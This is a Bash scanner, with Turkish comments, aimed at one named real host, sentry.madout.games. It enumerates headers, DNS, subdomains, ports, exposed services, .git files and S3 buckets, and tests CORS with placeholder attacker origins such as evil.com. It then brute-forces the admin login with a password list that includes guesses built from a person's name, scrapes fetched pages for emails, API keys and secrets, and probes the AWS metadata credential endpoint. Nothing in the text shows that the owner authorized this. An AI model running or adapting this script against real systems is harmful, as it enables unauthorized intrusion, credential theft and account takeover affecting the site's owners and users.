#!/bin/bash

# ============================================
# SENTRY SCANNER - ULTIMATE EDITION
# Tüm özellikler korundu, sadece hatalar giderildi
# ============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE="https://sentry.madout.games"
BASE_HTTP="http://sentry.madout.games"
OUTPUT_DIR="sentry_results"
TIMEOUT=3
mkdir -p "$OUTPUT_DIR"
mkdir -p "$OUTPUT_DIR/data"

echo -e "${BLUE}=====================================${NC}"
echo -e "${BLUE}  SENTRY SCANNER - ULTIMATE${NC}"
echo -e "${BLUE}=====================================${NC}"
echo "Started: $(date)"
echo ""

# ============================================
# 1. CSRF TOKEN AL
# ============================================
echo -e "${YELLOW}[1] Getting CSRF Token & Cookie${NC}"

curl -k -s -c "$OUTPUT_DIR/cookies.txt" "$BASE/auth/login/" > "$OUTPUT_DIR/login_page.html"

CSRF_TOKEN=$(grep -oE 'name="csrfmiddlewaretoken" value="[^"]*"' "$OUTPUT_DIR/login_page.html" | head -1 | sed 's/.*value="//;s/"//')

if [ -z "$CSRF_TOKEN" ]; then
    CSRF_TOKEN=$(sed -n 's/.*csrfmiddlewaretoken" value="\([^"]*\)".*/\1/p' "$OUTPUT_DIR/login_page.html" | head -1)
fi

if [ -n "$CSRF_TOKEN" ]; then
    echo -e "${GREEN}[+] CSRF Token: $CSRF_TOKEN${NC}"
    echo "$CSRF_TOKEN" > "$OUTPUT_DIR/data/csrf_token.txt"
else
    echo -e "${RED}[-] CSRF token not found${NC}"
fi

echo ""

# ============================================
# 2. GÜVENLİK HEADER'LARI
# ============================================
echo -e "${YELLOW}[2] Security Headers${NC}"

curl -k -s -I "$BASE/" > "$OUTPUT_DIR/data/headers.txt"

headers=(
    "Access-Control-Allow-Origin"
    "Strict-Transport-Security"
    "X-Frame-Options"
    "X-XSS-Protection"
    "X-Content-Type-Options"
    "Server"
    "X-Powered-By"
)

for header in "${headers[@]}"; do
    value=$(grep -i "^$header:" "$OUTPUT_DIR/data/headers.txt" | head -1 | sed 's/^[^:]*://;s/^[[:space:]]*//')
    if [ -n "$value" ]; then
        echo -e "${GREEN}[+] $header: $value${NC}"
        echo "$header: $value" >> "$OUTPUT_DIR/data/security_headers.txt"
    else
        echo -e "${RED}[-] $header: NOT SET${NC}"
        echo "$header: NOT SET" >> "$OUTPUT_DIR/data/security_headers.txt"
    fi
done

echo ""

# ============================================
# 3. SSL CERTIFICATE ANALİZİ
# ============================================
echo -e "${YELLOW}[3] SSL Certificate Analysis${NC}"

if command -v openssl &> /dev/null; then
    echo -n "Getting SSL certificate... "
    openssl s_client -connect sentry.madout.games:443 -servername sentry.madout.games 2>/dev/null </dev/null | openssl x509 -text -noout > "$OUTPUT_DIR/data/ssl_cert.txt" 2>/dev/null
    
    if [ -f "$OUTPUT_DIR/data/ssl_cert.txt" ]; then
        echo -e "${GREEN}OK${NC}"
        grep -E "Subject:|Issuer:|DNS:|Email:|Not Before|Not After" "$OUTPUT_DIR/data/ssl_cert.txt" | head -10
    fi
else
    echo -e "${YELLOW}[!] OpenSSL not installed, skipping${NC}"
fi

echo ""

# ============================================
# 4. DNS ENUMERATION
# ============================================
echo -e "${YELLOW}[4] DNS Enumeration${NC}"

if command -v dig &> /dev/null; then
    for record in A AAAA MX NS TXT CNAME; do
        echo -n "$record record... "
        dig "$record" madout.games +short 2>/dev/null | head -3 > "$OUTPUT_DIR/data/dns_${record}.txt"
        if [ -s "$OUTPUT_DIR/data/dns_${record}.txt" ]; then
            echo -e "${GREEN}FOUND${NC}"
            cat "$OUTPUT_DIR/data/dns_${record}.txt"
        else
            echo -e "${RED}NO${NC}"
        fi
    done
elif command -v nslookup &> /dev/null; then
    nslookup madout.games > "$OUTPUT_DIR/data/dns_nslookup.txt"
    echo -e "${GREEN}[+] DNS info saved${NC}"
else
    echo -e "${YELLOW}[!] dig/nslookup not installed, skipping${NC}"
fi

echo ""

# ============================================
# 5. CORS TESTİ (GENİŞLETİLDİ)
# ============================================
echo -e "${YELLOW}[5] CORS Testing${NC}"

origins=(
    "https://evil.com"
    "https://attacker.com"
    "https://hacker.net"
    "http://localhost"
    "https://localhost"
    "null"
)

for origin in "${origins[@]}"; do
    echo -n "Testing Origin: $origin... "
    response=$(curl -k -s -o /dev/null -w "%{http_code}" -H "Origin: $origin" "$BASE/api/0/" --connect-timeout $TIMEOUT 2>/dev/null)
    if [ "$response" == "200" ] || [ "$response" == "302" ]; then
        echo -e "${GREEN}ACCEPTED ($response)${NC}"
        echo "CORS: $origin accepted" >> "$OUTPUT_DIR/data/cors.txt"
    else
        echo -e "${RED}REJECTED ($response)${NC}"
    fi
done

echo ""

# ============================================
# 6. COOKIE GÜVENLİK
# ============================================
echo -e "${YELLOW}[6] Cookie Security${NC}"

if [ -f "$OUTPUT_DIR/cookies.txt" ]; then
    grep -i "HttpOnly" "$OUTPUT_DIR/cookies.txt" > /dev/null && echo -e "${GREEN}[+] HttpOnly flag present${NC}" || echo -e "${RED}[-] HttpOnly flag missing${NC}"
    grep -i "Secure" "$OUTPUT_DIR/cookies.txt" > /dev/null && echo -e "${GREEN}[+] Secure flag present${NC}" || echo -e "${RED}[-] Secure flag missing${NC}"
    grep -i "SameSite" "$OUTPUT_DIR/cookies.txt" > /dev/null && echo -e "${GREEN}[+] SameSite flag present${NC}" || echo -e "${RED}[-] SameSite flag missing${NC}"
fi

echo ""

# ============================================
# 7. GRAPHQL INTROSPECTION
# ============================================
echo -e "${YELLOW}[7] GraphQL Introspection${NC}"

graphql_endpoints=(
    "/graphql"
    "/api/graphql"
    "/api/v1/graphql"
    "/query"
    "/graphiql"
    "/playground"
)

for endpoint in "${graphql_endpoints[@]}"; do
    echo -n "Testing $endpoint... "
    query='{"query":"query { __schema { types { name } } }"}'
    response=$(curl -k -s -X POST "$BASE$endpoint" \
        -H "Content-Type: application/json" \
        -b "$OUTPUT_DIR/cookies.txt" \
        -d "$query" \
        -w "%{http_code}" \
        -o "$OUTPUT_DIR/data/graphql_$(echo $endpoint | tr '/' '_').json" \
        --connect-timeout $TIMEOUT 2>/dev/null)
    
    if [ "$response" == "200" ]; then
        echo -e "${GREEN}FOUND! ($response)${NC}"
        echo "$endpoint ($response)" >> "$OUTPUT_DIR/data/graphql.txt"
        if command -v python3 &> /dev/null; then
            python3 -c "import json; data=json.load(open('$OUTPUT_DIR/data/graphql_$(echo $endpoint | tr '/' '_').json')); print(json.dumps(data, indent=2))" > "$OUTPUT_DIR/data/graphql_$(echo $endpoint | tr '/' '_')_pretty.json" 2>/dev/null
        fi
    else
        echo -e "${RED}NO ($response)${NC}"
    fi
done

echo ""

# ============================================
# 8. SERVİS KEŞFİ
# ============================================
echo -e "${YELLOW}[8] Service Discovery${NC}"

services=(
    "/wordpress/" "/wp-admin/" "/wp-login.php" "/xmlrpc.php"
    "/phpmyadmin/" "/pma/" "/myadmin/" "/mysql/" "/db/"
    "/jenkins/" "/job/" "/view/"
    "/api/v1/namespaces/" "/api/v1/pods/"
    "/v2/_catalog" "/v2/"
    "/_cat/indices" "/_cat/"
    "/grafana/" "/metrics" "/prometheus/"
    "/v1/agent/services" "/v1/sys/health" "/v1/secret/"
    "/minio/" "/lab/" "/tree/" "/notebooks/"
    "/kibana/" "/rabbitmq/" "/swagger/" "/api-docs/"
)

for service in "${services[@]}"; do
    echo -n "Testing $service... "
    response=$(curl -k -s -o /dev/null -w "%{http_code}" -b "$OUTPUT_DIR/cookies.txt" "$BASE$service" --connect-timeout $TIMEOUT 2>/dev/null)
    
    if [ "$response" == "200" ] || [ "$response" == "302" ] || [ "$response" == "401" ] || [ "$response" == "403" ]; then
        echo -e "${GREEN}FOUND! ($response)${NC}"
        echo "$service ($response)" >> "$OUTPUT_DIR/data/services.txt"
    else
        echo -e "${RED}NO ($response)${NC}"
    fi
done

echo ""

# ============================================
# 9. PORT TARAMA (DÜZELTİLDİ - false-positive azaltıldı)
# ============================================
echo -e "${YELLOW}[9] Port Scanning (Validated)${NC}"

ports=(80 443 8080 8443 3000 5000 8000 9000 9443 15672 5672 6379 9200 27017 9090 8081)

for port in "${ports[@]}"; do
    echo -n "Testing port $port... "
    
    # nc ile TCP bağlantı testi
    if command -v nc &> /dev/null; then
        nc -zv -w $TIMEOUT sentry.madout.games $port 2>/dev/null
        if [ $? -eq 0 ]; then
            # Port açık, HTTP cevabını kontrol et
            response=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "https://sentry.madout.games:$port" 2>/dev/null)
            
            if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ] || [ "$response" == "401" ] || [ "$response" == "403" ]; then
                echo -e "${GREEN}OPEN (HTTP $response)${NC}"
                echo "$port (HTTP $response)" >> "$OUTPUT_DIR/data/ports.txt"
            else
                echo -e "${YELLOW}OPEN (Unknown service: $response)${NC}"
                echo "$port (Unknown: $response)" >> "$OUTPUT_DIR/data/ports_unknown.txt"
            fi
        else
            echo -e "${RED}CLOSED${NC}"
        fi
    else
        # nc yoksa curl ile dene
        response=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "https://sentry.madout.games:$port" 2>/dev/null)
        
        if [ "$response" != "000" ] && [ "$response" != "404" ]; then
            echo -e "${GREEN}OPEN (HTTP $response)${NC}"
            echo "$port (HTTP $response)" >> "$OUTPUT_DIR/data/ports.txt"
        else
            echo -e "${RED}CLOSED${NC}"
        fi
    fi
done

echo ""

# ============================================
# 10. SUBDOMAIN TARAMA (DÜZELTİLDİ - false-positive azaltıldı)
# ============================================
echo -e "${YELLOW}[10] Scanning subdomains${NC}"

subdomains=(
    "api" "admin" "dev" "test" "staging" "backup"
    "dashboard" "panel" "console" "manage" "control"
    "monitor" "metrics" "logs" "trace" "debug"
    "beta" "preview" "sandbox" "demo" "cdn"
    "static" "media" "files" "upload" "download"
    "auth" "login" "account" "profile" "settings"
)

for sub in "${subdomains[@]}"; do
    echo -n "Testing $sub.madout.games... "
    url="https://$sub.madout.games"
    response=$(curl -k -s -o /dev/null -w "%{http_code}" "$url" --connect-timeout $TIMEOUT 2>/dev/null)
    
    if [ "$response" == "200" ] || [ "$response" == "301" ] || [ "$response" == "302" ] || [ "$response" == "401" ] || [ "$response" == "403" ]; then
        echo -e "${GREEN}ACTIVE ($response)${NC}"
        echo "$url ($response)" >> "$OUTPUT_DIR/data/subdomains.txt"
        
        # Sayfa içeriğini kontrol et
        content=$(curl -k -s "$url" --connect-timeout $TIMEOUT 2>/dev/null | head -c 500 | grep -i "sentry\|madout\|auth\|login" | head -1)
        if [ -n "$content" ]; then
            echo -e "${CYAN}    + Sentry-related content found${NC}"
            echo "$url: Sentry-related" >> "$OUTPUT_DIR/data/subdomains_validated.txt"
        fi
    elif [ "$response" != "000" ] && [ "$response" != "404" ]; then
        echo -e "${YELLOW}WAF/PROXY ($response)${NC}"
        echo "$url (WAF/PROXY: $response)" >> "$OUTPUT_DIR/data/subdomains_waf.txt"
    else
        echo -e "${RED}NO ($response)${NC}"
    fi
done

echo ""

# ============================================
# 11. DNS VALIDATION (Subdomain doğrulama)
# ============================================
echo -e "${YELLOW}[11] DNS Validation${NC}"

for sub in "${subdomains[@]}"; do
    echo -n "DNS $sub.madout.games... "
    if command -v dig &> /dev/null; then
        ip=$(dig "$sub.madout.games" A +short 2>/dev/null | head -1)
        if [ -n "$ip" ]; then
            echo -e "${GREEN}FOUND ($ip)${NC}"
            echo "$sub.madout.games -> $ip" >> "$OUTPUT_DIR/data/dns_validated.txt"
        else
            echo -e "${RED}NO${NC}"
        fi
    elif command -v host &> /dev/null; then
        ip=$(host "$sub.madout.games" 2>/dev/null | grep "has address" | head -1 | awk '{print $NF}')
        if [ -n "$ip" ]; then
            echo -e "${GREEN}FOUND ($ip)${NC}"
            echo "$sub.madout.games -> $ip" >> "$OUTPUT_DIR/data/dns_validated.txt"
        else
            echo -e "${RED}NO${NC}"
        fi
    else
        echo -e "${YELLOW}SKIP (dig/host not found)${NC}"
        break
    fi
done

echo ""

# ============================================
# 12. RATE LIMIT TEST
# ============================================
echo -e "${YELLOW}[12] Rate Limit Test${NC}"

echo -n "Sending 100 requests"
limited=0
for i in {1..100}; do
    response=$(curl -k -s -o /dev/null -w "%{http_code}" -b "$OUTPUT_DIR/cookies.txt" "$BASE/auth/login/" --connect-timeout $TIMEOUT 2>/dev/null)
    if [ "$response" == "429" ]; then
        limited=$i
        break
    fi
    if [ $((i % 10)) -eq 0 ]; then
        echo -n "."
    fi
done

if [ "$limited" -gt 0 ]; then
    echo -e "\n${GREEN}[+] Rate limited at $limited requests${NC}"
    echo "Rate limited at $limited requests" >> "$OUTPUT_DIR/data/rate_limit.txt"
else
    echo -e "\n${GREEN}[+] No rate limit detected${NC}"
    echo "No rate limit detected" >> "$OUTPUT_DIR/data/rate_limit.txt"
fi

echo ""

# ============================================
# 13. BRUTE FORCE
# ============================================
echo -e "${YELLOW}[13] Brute Force Login${NC}"

if [ -n "$CSRF_TOKEN" ]; then
    passwords=(
        "admin" "password" "123456" "qwerty" "admin123"
        "sentry" "madout" "test" "password123" "adminadmin"
        "letmein" "welcome" "monkey" "dragon" "master"
        "changeme" "Sentry2026" "MadOut2026" "Roman2026" "Sichenko2026"
    )
    
    for pass in "${passwords[@]}"; do
        echo -n "Trying admin:$pass... "
        response=$(curl -k -s -X POST "$BASE/auth/login/" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -H "Referer: $BASE/auth/login/" \
            -b "$OUTPUT_DIR/cookies.txt" \
            -c "$OUTPUT_DIR/cookies.txt" \
            -d "csrfmiddlewaretoken=$CSRF_TOKEN" \
            -d "username=admin" \
            -d "password=$pass" \
            -d "op=login" \
            -w "%{http_code}" \
            -o /dev/null --connect-timeout $TIMEOUT)
        
        if [ "$response" == "302" ] || [ "$response" == "200" ]; then
            echo -e "${GREEN}SUCCESS! Password: $pass${NC}"
            echo "admin:$pass" >> "$OUTPUT_DIR/data/cracked.txt"
            break
        else
            echo -e "${RED}FAIL ($response)${NC}"
        fi
    done
fi

echo ""

# ============================================
# 14. HTTP VS HTTPS
# ============================================
echo -e "${YELLOW}[14] HTTP vs HTTPS${NC}"

echo -n "Testing HTTP version... "
http_response=$(curl -k -s -o /dev/null -w "%{http_code}" "$BASE_HTTP/" --connect-timeout $TIMEOUT 2>/dev/null)
if [ "$http_response" != "000" ] && [ "$http_response" != "301" ] && [ "$http_response" != "302" ]; then
    echo -e "${GREEN}ACCESSIBLE! ($http_response)${NC}"
    echo "HTTP accessible: $http_response" >> "$OUTPUT_DIR/data/http_test.txt"
else
    echo -e "${RED}REDIRECTS TO HTTPS ($http_response)${NC}"
fi

echo ""

# ============================================
# 15. JWT TOKEN TEST (DECODE İLE)
# ============================================
echo -e "${YELLOW}[15] JWT Token Test${NC}"

for file in "$OUTPUT_DIR"/*.html "$OUTPUT_DIR"/data/*.html "$OUTPUT_DIR"/*.json 2>/dev/null; do
    if [ -f "$file" ]; then
        grep -oE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$file" 2>/dev/null | while read token; do
            echo -e "${GREEN}[+] JWT found${NC}"
            echo "$token" >> "$OUTPUT_DIR/data/jwt_tokens.txt"
            
            if command -v python3 &> /dev/null; then
                python3 -c "
import base64, json
try:
    parts = '$token'.split('.')
    if len(parts) == 3:
        header = base64.b64decode(parts[0] + '==')
        payload = base64.b64decode(parts[1] + '==')
        print('Header:', json.loads(header))
        print('Payload:', json.loads(payload))
except:
    pass
" > "$OUTPUT_DIR/data/jwt_$(echo $token | cut -c1-10)_decoded.txt" 2>/dev/null
                echo -e "${CYAN}    Decoded saved${NC}"
            fi
        done
    fi
done

echo ""

# ============================================
# 16. VERİ ÇIKARMA
# ============================================
echo -e "${YELLOW}[16] Extracting Sensitive Data${NC}"

for file in "$OUTPUT_DIR"/*.html "$OUTPUT_DIR"/*/*.html "$OUTPUT_DIR"/*.json "$OUTPUT_DIR"/*/*.json 2>/dev/null; do
    if [ -f "$file" ]; then
        grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b" "$file" 2>/dev/null >> "$OUTPUT_DIR/data/emails.txt"
        grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" "$file" 2>/dev/null | grep -v "255\|0.0.0.0\|127.0.0.1" >> "$OUTPUT_DIR/data/ips.txt"
        grep -oE "(sk-[a-zA-Z0-9]{32,}|pk_[a-zA-Z0-9]{32,}|[a-f0-9]{32,})" "$file" 2>/dev/null >> "$OUTPUT_DIR/data/api_keys.txt"
        grep -oE "(SECRET|secret)[_\-]?[A-Z_]*[ =:]+[a-zA-Z0-9_\-]{8,}" "$file" 2>/dev/null >> "$OUTPUT_DIR/data/secrets.txt"
    fi
done

# Sort and unique
for f in emails.txt ips.txt api_keys.txt secrets.txt; do
    if [ -f "$OUTPUT_DIR/data/$f" ]; then
        sort -u "$OUTPUT_DIR/data/$f" -o "$OUTPUT_DIR/data/$f" 2>/dev/null
    fi
done

echo ""

# ============================================
# 17. WAYBACK MACHINE
# ============================================
echo -e "${YELLOW}[17] Wayback Machine${NC}"

curl -k -s "https://archive.org/wayback/available?url=sentry.madout.games" 2>/dev/null > "$OUTPUT_DIR/data/wayback.json"
echo -e "${GREEN}[+] Wayback results saved${NC}"

echo ""

# ============================================
# 18. GITHUB SEARCH
# ============================================
echo -e "${YELLOW}[18] GitHub Search${NC}"

curl -k -s "https://api.github.com/search/code?q=sentry.madout.games" 2>/dev/null > "$OUTPUT_DIR/data/github_raw.json"
echo -e "${GREEN}[+] GitHub results saved${NC}"

echo ""

# ============================================
# 19. S3 BUCKET ENUMERATION
# ============================================
echo -e "${YELLOW}[19] S3 Bucket Enumeration${NC}"

buckets=(
    "sentry.madout.games"
    "sentry-madout-games"
    "madout-games"
    "sentry-backup"
    "sentry-static"
    "sentry-media"
    "sentry-files"
    "sentry-data"
    "madout-sentry"
    "sentry-production"
)

for bucket in "${buckets[@]}"; do
    echo -n "Testing $bucket.s3.amazonaws.com... "
    response=$(curl -k -s -o /dev/null -w "%{http_code}" "https://$bucket.s3.amazonaws.com/" --connect-timeout $TIMEOUT 2>/dev/null)
    
    if [ "$response" == "200" ] || [ "$response" == "403" ]; then
        echo -e "${GREEN}FOUND! ($response)${NC}"
        echo "$bucket.s3.amazonaws.com ($response)" >> "$OUTPUT_DIR/data/s3_buckets.txt"
    else
        echo -e "${RED}NO ($response)${NC}"
    fi
done

echo ""

# ============================================
# 20. .git EXPLOIT CHECK
# ============================================
echo -e "${YELLOW}[20] .git Exploit Check${NC}"

git_files=(
    "/.git/config"
    "/.git/HEAD"
    "/.git/index"
    "/.git/objects/"
    "/.git/refs/heads/main"
    "/.git/refs/heads/master"
    "/.git/logs/HEAD"
)

for file in "${git_files[@]}"; do
    echo -n "Testing $file... "
    response=$(curl -k -s -o /dev/null -w "%{http_code}" -b "$OUTPUT_DIR/cookies.txt" "$BASE$file" --connect-timeout $TIMEOUT 2>/dev/null)
    
    if [ "$response" == "200" ] || [ "$response" == "302" ] || [ "$response" == "403" ]; then
        echo -e "${GREEN}FOUND! ($response)${NC}"
        echo "$file ($response)" >> "$OUTPUT_DIR/data/git_found.txt"
        curl -k -s -b "$OUTPUT_DIR/cookies.txt" "$BASE$file" > "$OUTPUT_DIR/data/git_$(echo $file | tr '/' '_' | cut -c1-30).html" 2>/dev/null
    else
        echo -e "${RED}NO ($response)${NC}"
    fi
done

echo ""

# ============================================
# 21. AWS METADATA (SSRF)
# ============================================
echo -e "${YELLOW}[21] AWS Metadata Test${NC}"

metadata_paths=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://169.254.169.254/latest/user-data/"
)

for path in "${metadata_paths[@]}"; do
    echo -n "Testing $path... "
    response=$(curl -k -s -o /dev/null -w "%{http_code}" --connect-timeout $TIMEOUT "$path" 2>/dev/null)
    
    if [ "$response" == "200" ] || [ "$response" == "401" ]; then
        echo -e "${GREEN}ACCESSIBLE! ($response)${NC}"
        echo "$path ($response)" >> "$OUTPUT_DIR/data/aws_metadata.txt"
        curl -k -s --connect-timeout $TIMEOUT "$path" > "$OUTPUT_DIR/data/aws_metadata_$(echo $path | tr '/' '_' | cut -c1-30).html" 2>/dev/null
    else
        echo -e "${RED}NO ($response)${NC}"
    fi
done

echo ""

# ============================================
# 22. FINAL REPORT
# ============================================
echo -e "${BLUE}=====================================${NC}"
echo -e "${GREEN}SCAN COMPLETE!${NC}"
echo -e "${BLUE}=====================================${NC}"
echo ""
echo -e "${GREEN}Results saved to: $OUTPUT_DIR/${NC}"
echo ""
echo -e "${YELLOW}FINDINGS SUMMARY:${NC}"
echo -e "${CYAN}Emails found: $(cat "$OUTPUT_DIR/data/emails.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}IPs found: $(cat "$OUTPUT_DIR/data/ips.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}API Keys found: $(cat "$OUTPUT_DIR/data/api_keys.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Secrets found: $(cat "$OUTPUT_DIR/data/secrets.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Subdomains found: $(cat "$OUTPUT_DIR/data/subdomains.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Subdomains (DNS validated): $(cat "$OUTPUT_DIR/data/dns_validated.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Subdomains (WAF/Proxy): $(cat "$OUTPUT_DIR/data/subdomains_waf.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Services found: $(cat "$OUTPUT_DIR/data/services.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}Ports open: $(cat "$OUTPUT_DIR/data/ports.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}JWT tokens found: $(cat "$OUTPUT_DIR/data/jwt_tokens.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}S3 buckets found: $(cat "$OUTPUT_DIR/data/s3_buckets.txt" 2>/dev/null | wc -l)${NC}"
echo -e "${CYAN}.git exposed: $(cat "$OUTPUT_DIR/data/git_found.txt" 2>/dev/null | wc -l)${NC}"
echo ""
echo -e "${YELLOW}CRITICAL FINDINGS:${NC}"

[ -f "$OUTPUT_DIR/data/api_keys.txt" ] && [ -s "$OUTPUT_DIR/data/api_keys.txt" ] && echo -e "${RED}[!] API KEYS FOUND!${NC}" && cat "$OUTPUT_DIR/data/api_keys.txt"
[ -f "$OUTPUT_DIR/data/cracked.txt" ] && [ -s "$OUTPUT_DIR/data/cracked.txt" ] && echo -e "${RED}[!] CRACKED CREDENTIALS!${NC}" && cat "$OUTPUT_DIR/data/cracked.txt"
[ -f "$OUTPUT_DIR/data/jwt_tokens.txt" ] && [ -s "$OUTPUT_DIR/data/jwt_tokens.txt" ] && echo -e "${RED}[!] JWT TOKENS FOUND!${NC}" && head -3 "$OUTPUT_DIR/data/jwt_tokens.txt"
[ -f "$OUTPUT_DIR/data/s3_buckets.txt" ] && [ -s "$OUTPUT_DIR/data/s3_buckets.txt" ] && echo -e "${RED}[!] S3 BUCKETS FOUND!${NC}" && cat "$OUTPUT_DIR/data/s3_buckets.txt"
[ -f "$OUTPUT_DIR/data/git_found.txt" ] && [ -s "$OUTPUT_DIR/data/git_found.txt" ] && echo -e "${RED}[!] .git EXPOSED!${NC}" && cat "$OUTPUT_DIR/data/git_found.txt"

echo ""
echo -e "${BLUE}=====================================${NC}"
echo -e "${GREEN}CSRF Token: $CSRF_TOKEN${NC}"
echo -e "${GREEN}Cookies: $(cat "$OUTPUT_DIR/cookies.txt" 2>/dev/null | wc -l) lines${NC}"
echo -e "${BLUE}=====================================${NC}"
